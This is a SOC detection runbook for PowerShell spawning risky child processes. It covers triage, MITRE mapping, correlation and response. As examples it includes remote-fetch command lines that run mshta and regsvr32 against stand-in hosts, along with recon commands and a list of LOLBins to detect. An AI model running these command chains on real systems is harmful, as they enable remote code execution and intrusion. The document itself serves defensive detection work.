# DET-010 — PowerShell Spawning an Unusual Child Process

## Alert Description

This detection identifies PowerShell or PowerShell Core spawning selected higher-risk child processes that are commonly associated with suspicious execution chains, living-off-the-land techniques, script execution, persistence, or defense evasion.

The initial DET-010 coverage focuses on child processes such as:

- `cmd.exe`
- `rundll32.exe`
- `regsvr32.exe`
- `mshta.exe`
- `wscript.exe`
- `cscript.exe`
- `schtasks.exe`
- `certutil.exe`

These binaries are legitimate Windows components and may be launched by PowerShell during normal administration, automation, deployment, or troubleshooting. The alert should therefore be treated as a **process-chain anomaly requiring contextual investigation**, not automatic proof of compromise.

---

## Detection Objective

Identify suspicious parent-child process relationships where PowerShell launches a higher-risk Windows binary.

The current Detection-as-Code logic is conceptually:

```text
ParentImage = powershell.exe / pwsh.exe
        +
Child Image = selected higher-risk executable
        =
DET-010 match
```

Example:

```text
powershell.exe
        ↓
mshta.exe
```

This process chain is more security-relevant than a benign child such as:

```text
powershell.exe
        ↓
notepad.exe
```

---

## MITRE ATT&CK Mapping

### T1059.001 — Command and Scripting Interpreter: PowerShell

Adversaries may use PowerShell to execute commands, scripts, and other programs.

### Related Techniques

Depending on the child process and command line, the activity may also relate to:

- **T1218 — System Binary Proxy Execution**
- **T1053.005 — Scheduled Task/Job: Scheduled Task**
- **T1105 — Ingress Tool Transfer**
- **T1562.001 — Impair Defenses**
- **T1218.011 — Rundll32**
- **T1218.010 — Regsvr32**
- **T1218.005 — Mshta**

### Primary Tactic

- Execution

Potential secondary tactics include:

- Defense Evasion
- Persistence
- Command and Control

---

## Relevant Telemetry

DET-010 is designed primarily around process-creation telemetry.

Useful sources include:

- Windows Security Event ID 4688;
- Sysmon Event ID 1;
- EDR process telemetry.

Important fields include:

- `Image`
- `CommandLine`
- `ParentImage`
- `ParentCommandLine`
- `User`
- `Computer`
- `ProcessId`
- `ParentProcessId`
- timestamp
- hashes
- signer information

---

## Initial Triage

When DET-010 triggers, collect and review:

1. Hostname
2. User account
3. Parent process
4. Parent command line
5. Child process
6. Child command line
7. Parent PID
8. Child PID
9. Timestamp
10. Referenced file, URL, DLL, or script
11. Child-process descendants
12. Network activity
13. File creation
14. PowerShell operational logs
15. Related EDR alerts
16. Persistence or credential-access behavior
17. Similar process chains across other endpoints

---

## Key Questions

The analyst should determine:

- Why did PowerShell launch this child process?
- Is the parent PowerShell activity expected?
- What command line launched the child?
- What does the child process execute or access?
- Is the child binary located in a normal Windows path?
- Was remote content referenced?
- Did the child process spawn additional processes?
- Did the chain create persistence?
- Was Defender or EDR weakened?
- Was LSASS accessed afterward?
- Did the activity originate from an unusual user or host?
- Is the same chain common in the environment?

---

## Why Parent-Child Relationships Matter

Individual process names often have low signal.

For example:

```text
mshta.exe
```

may be legitimate.

However:

```text
powershell.exe
        ↓
mshta.exe
        ↓
remote HTA
```

is much more suspicious.

Detection quality improves when analysts evaluate the **process chain**, not isolated binaries.

---

# PowerShell Parent Analysis

## `powershell.exe` and `pwsh.exe`

PowerShell is widely used for legitimate:

- administration;
- deployment;
- automation;
- endpoint management;
- software installation;
- troubleshooting.

Attackers also use it because it provides:

- script execution;
- .NET access;
- process creation;
- network access;
- registry access;
- file operations.

Therefore, DET-010 does not classify PowerShell itself as malicious.

The signal comes from the **combination of parent and child behavior**.

---

## Parent Command-Line Review

Review the complete PowerShell command line.

Look for:

```text
-EncodedCommand
-enc
-NoProfile
-ExecutionPolicy Bypass
-WindowStyle Hidden
IEX
Invoke-Expression
DownloadString
Invoke-WebRequest
Start-Process
```

Example:

```text
powershell.exe -NoProfile -Command Start-Process mshta.exe
```

A child-process alert becomes more meaningful when the parent command is also suspicious.

---

# Child Process Analysis

## `cmd.exe`

PowerShell frequently launches `cmd.exe` legitimately.

Therefore, this combination should receive context-based triage rather than automatic escalation.

Higher-risk examples include:

```text
powershell.exe
        ↓
cmd.exe /c whoami && net user
```

or:

```text
powershell.exe
        ↓
cmd.exe /c payload.exe
```

Review the child command line.

---

## `mshta.exe`

PowerShell spawning `mshta.exe` deserves increased scrutiny.

Example:

```text
powershell.exe
        ↓
mshta.exe https://example.invalid/payload.hta
```

This may indicate signed-binary proxy execution or remote script execution.

Correlate with DET-009 logic.

---

## `rundll32.exe`

PowerShell launching `rundll32.exe` can be legitimate, but unusual DLL or script-like invocation should be investigated.

Example:

```text
powershell.exe
        ↓
rundll32.exe C:\Users\Public\unknown.dll,EntryPoint
```

Increase priority when the referenced DLL is:

- unsigned;
- newly created;
- user-writable;
- downloaded externally.

---

## `regsvr32.exe`

Example suspicious chain:

```text
powershell.exe
        ↓
regsvr32.exe /i:https://example.invalid/file.sct scrobj.dll
```

This may indicate proxy execution through a signed Windows binary.

---

## `wscript.exe` / `cscript.exe`

These interpreters can execute:

- VBScript;
- JavaScript;
- Windows Script Host content.

Example:

```text
powershell.exe
        ↓
wscript.exe C:\Users\Public\update.vbs
```

Investigate the script content and origin.

---

## `schtasks.exe`

PowerShell spawning `schtasks.exe` may indicate scheduled-task creation.

Example:

```text
powershell.exe
        ↓
schtasks.exe /create ...
```

Correlate with DET-007.

Determine:

- task name;
- task action;
- trigger;
- run account;
- run level.

---

## `certutil.exe`

`certutil.exe` is a legitimate certificate utility but can be abused for file retrieval or transformation.

Review the command line for:

- URLs;
- file output paths;
- decoding activity;
- unusual parameters.

The binary itself should not be treated as malicious.

---

## Process-Tree Reconstruction

Build the process tree.

Example:

```text
winword.exe
        ↓
powershell.exe
        ↓
mshta.exe
        ↓
cmd.exe
        ↓
payload.exe
```

Each additional suspicious transition increases confidence that the activity is malicious.

---

## Grandparent Process Analysis

Do not stop at PowerShell.

Identify what launched PowerShell.

Higher-risk grandparent processes include:

```text
winword.exe
excel.exe
outlook.exe
powerpnt.exe
mshta.exe
wscript.exe
cscript.exe
unknown executable
```

Example:

```text
outlook.exe
        ↓
powershell.exe
        ↓
rundll32.exe
```

This is more suspicious than PowerShell launched by an approved management agent.

---

## User-Writable Path Analysis

Increase scrutiny when the child process references files in:

```text
C:\Users\Public
C:\Temp
%TEMP%
%APPDATA%
%LOCALAPPDATA%
Downloads
Desktop
```

Example:

```text
powershell.exe
        ↓
rundll32.exe
        ↓
C:\Users\Public\payload.dll
```

User-writable payload locations frequently appear in post-exploitation chains.

---

## File Investigation

If the child process references a file, collect:

```text
filename
full path
SHA256
size
creation time
modification time
digital signature
```

Determine:

- what created the file;
- whether it was downloaded;
- whether it is signed;
- whether it is prevalent;
- whether it executed elsewhere.

---

## Network Correlation

Review network activity from:

- PowerShell;
- the child process;
- child-process descendants.

Useful telemetry includes:

- DNS;
- proxy;
- firewall;
- EDR network events.

Example:

```text
powershell.exe
        ↓
mshta.exe
        ↓
outbound HTTPS connection
```

This substantially increases investigative priority.

---

## DET-001 Correlation

Example:

```text
DET-001
Encoded PowerShell
        ↓
DET-010
PowerShell spawns unusual child
```

This suggests obfuscated PowerShell may be launching additional tooling.

---

## DET-002 Correlation

Example:

```text
DET-002
PowerShell download cradle
        ↓
DET-010
PowerShell launches child executable
```

This may represent download-and-execute behavior.

---

## DET-006 Correlation

Example:

```text
DET-006
Defender weakened
        ↓
DET-010
PowerShell spawns unusual child
```

This should receive high priority because security controls may have been weakened before execution.

---

## DET-007 Correlation

Example:

```text
DET-010
PowerShell
        ↓
schtasks.exe
        ↓
DET-007
scheduled task created
```

This may indicate persistence.

---

## DET-008 Correlation

Example:

```text
DET-010
PowerShell launches tool
        ↓
DET-008
tool accesses LSASS
```

This can indicate credential dumping.

---

## DET-009 Correlation

Example:

```text
DET-010
PowerShell
        ↓
mshta.exe / rundll32.exe / regsvr32.exe
        ↓
DET-009
suspicious LOLBin invocation
```

This is a strong multi-detection chain.

---

## Child-Process Follow-Up

Determine what the child launched next.

Example:

```text
powershell.exe
        ↓
mshta.exe
        ↓
powershell.exe
        ↓
payload.exe
```

Recursive process-chain analysis is important because the first suspicious child may only be an intermediate stage.

---

## Persistence Follow-Up

Review for:

- scheduled tasks;
- services;
- Run/RunOnce registry keys;
- startup folders;
- WMI persistence;
- new accounts;
- local administrator changes.

The process chain may be part of a persistence setup.

---

## Credential-Access Follow-Up

Look for:

- LSASS access;
- dump-file creation;
- SAM/SECURITY hive access;
- browser credential theft;
- token manipulation.

Example:

```text
PowerShell
        ↓
credential tool
        ↓
LSASS
```

---

## Defense Evasion Follow-Up

Review for:

- Defender disablement;
- EDR tampering;
- AMSI bypass;
- event-log clearing;
- firewall modifications;
- process injection;
- task deletion.

---

## Lateral Movement Follow-Up

Investigate whether the process chain is followed by:

- RDP;
- SMB;
- WinRM;
- WMI;
- remote services;
- administrative-share access;
- successful logons to additional systems.

---

## Escalation Indicators

Escalate when one or more of the following are present:

- PowerShell command line is encoded or obfuscated;
- child process is a known LOLBin;
- child process references remote content;
- payload is located in a user-writable path;
- PowerShell was launched by Office;
- child process is unsigned or rare;
- suspicious network traffic follows;
- Defender or EDR was weakened;
- persistence is created;
- credential access follows;
- lateral movement follows;
- user denies the activity;
- similar process chains appear across multiple endpoints.

---

## False Positives

Potential legitimate causes include:

- administrator automation;
- software deployment;
- endpoint management;
- troubleshooting;
- installation scripts;
- enterprise configuration tooling;
- development workflows.

To close as benign, validate:

```text
Parent PowerShell
+
Parent command line
+
Child process
+
Child command line
+
User
+
Business purpose
+
Follow-on behavior
```

---

## Suggested Triage Flow

```text
DET-010 Alert
     |
     v
Identify PowerShell parent
     |
     v
Review parent command line
     |
     v
Identify child process
     |
     v
Review child command line
     |
     v
Review grandparent process
     |
     v
Was execution authorized?
     |
     +---- Yes ----------------------+
     |                               |
     |                      Validate normal workflow
     |
     v
Inspect referenced files / URLs
     |
     v
Review child descendants
     |
     v
Check network activity
     |
     v
Review persistence / credential access
     |
     v
Determine benign vs suspicious
```

---

## Analyst Decision

### Benign / Expected

Close as benign when:

- PowerShell activity is authorized;
- the child process is expected;
- command lines match a documented workflow;
- the parent and grandparent processes are legitimate;
- no suspicious file, network, persistence, or credential behavior follows.

Document the business justification.

### Suspicious

Escalate when:

- the process chain is unusual;
- the PowerShell command is obfuscated;
- the child process is a LOLBin;
- a user-writable payload is referenced;
- remote content is involved;
- the grandparent process is unusual;
- related security alerts exist.

### Confirmed or Probable Compromise

Treat as probable or confirmed compromise when the chain is associated with:

- malicious payload execution;
- command-and-control;
- credential dumping;
- persistence;
- defense evasion;
- lateral movement;
- unauthorized remote execution.

Potential response actions may include:

- isolate affected endpoints;
- terminate malicious processes;
- quarantine associated files;
- block malicious infrastructure;
- remove persistence;
- restore security controls;
- reset exposed credentials where justified;
- hunt for the same process chain across the environment;
- preserve forensic evidence;
- escalate according to incident-response procedures.

---

## Evidence to Preserve

Collect and preserve:

- process-creation event;
- ParentImage;
- ParentCommandLine;
- child Image;
- child CommandLine;
- grandparent process;
- user;
- hostname;
- timestamp;
- process ID;
- parent PID;
- child descendants;
- referenced files;
- SHA256 hashes;
- signer information;
- URLs;
- DNS activity;
- network connections;
- PowerShell logs;
- EDR alerts;
- persistence events;
- credential-access events;
- analyst timeline.

---

## Example Detection Scenario

### Process Event

```text
EventID:
4688

ParentImage:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine:
powershell.exe -NoProfile -Command Start-Process mshta.exe

Image:
C:\Windows\System32\mshta.exe

CommandLine:
mshta.exe https://example.invalid/payload.hta

User:
LAB\test-user

Computer:
WIN11-LAB
```

### Detection Reason

```text
PowerShell parent
        +
higher-risk child process
        =
DET-010 match
```

### Expected Analyst Action

Review both parent and child command lines, identify the grandparent process, investigate any referenced URL or payload, and correlate the process chain with network activity, persistence, defense evasion, and credential-access behavior.

---

## Detection Limitations

DET-010 intentionally uses a static list of child processes.

It may miss:

- suspicious child binaries not included in the list;
- renamed tools;
- indirect process creation;
- WMI or COM execution;
- activity where parent-process telemetry is incomplete;
- malicious behavior performed entirely within PowerShell.

It may also produce false positives because many of the listed children are used legitimately.

Production implementations should combine process lineage with:

```text
CommandLine
+
ParentCommandLine
+
grandparent process
+
file path
+
signer
+
network activity
+
environment baseline
```

---

## Detection Engineering Notes

DET-010 completes the initial 10-detection portfolio.

Final coverage:

```text
DET-001 — Encoded PowerShell execution
DET-002 — PowerShell download behavior
DET-003 — Repeated authentication failures
DET-004 — Failures followed by successful authentication
DET-005 — Local administrator privilege assignment
DET-006 — Defender protection modification
DET-007 — Scheduled task creation
DET-008 — Suspicious LSASS access
DET-009 — Suspicious LOLBin execution
DET-010 — PowerShell spawning unusual child process
```

The portfolio now demonstrates:

- single-event behavioral detections;
- multi-event temporal correlation;
- authentication analytics;
- privilege-change monitoring;
- persistence detection;
- credential-access detection;
- defense-evasion detection;
- living-off-the-land detection;
- parent-child process analysis.

Positive and negative fixtures should remain version-controlled so changes cannot silently break detection behavior.

---

## Recommended Production Refinement

A stronger production detector should not treat every listed PowerShell child process as equally suspicious.

Prefer contextual scoring such as:

```text
PowerShell parent
+
unusual child
+
suspicious child arguments
+
user-writable payload
+
network activity
```

or:

```text
Office
        ↓
PowerShell
        ↓
LOLBin
```

or:

```text
Defender weakened
        ↓
PowerShell
        ↓
credential-access tool
```

This provides higher precision than parent-child matching alone.

---

## Final Analyst Principle

> A suspicious process chain is stronger evidence than a suspicious process name. Its security significance depends on what launched PowerShell, which child it created, how both processes were invoked, and what execution, network, persistence, or credential-access behavior followed.
